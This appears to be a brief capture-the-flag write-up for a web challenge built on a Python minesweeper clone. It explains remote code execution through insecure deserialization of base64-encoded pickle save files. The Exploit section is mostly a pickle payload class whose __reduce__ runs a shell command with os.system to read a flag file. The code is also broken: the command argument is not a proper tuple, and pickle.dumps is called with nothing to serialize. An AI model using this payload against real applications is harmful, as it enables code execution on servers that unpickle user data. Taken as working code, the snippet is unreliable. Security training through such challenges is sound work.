# CyberOpen Season II - Sweeper - Web Exploitation

## Challenge Description

A twist on a classic game. Tread lightly while you dig up the flag.

## High-level summary

This custom python implementation of Windows' classic minesweeper game has a RCE vulnerability through insecure deserialization in the load/save aspect of the web application. The save files are base64 encoded python pickle objects that can be used to obtain RCE.

## Investigation

![alt text] (./images/hexdump.PNG)

## Exploit

```python
import os
import pickle
import base64

class RCE():
    def __reduce__(self):
        return (os.system, "cat /flag.txt",)

if __name__ == '__main__':
    pickle = pickle.dumps()
```
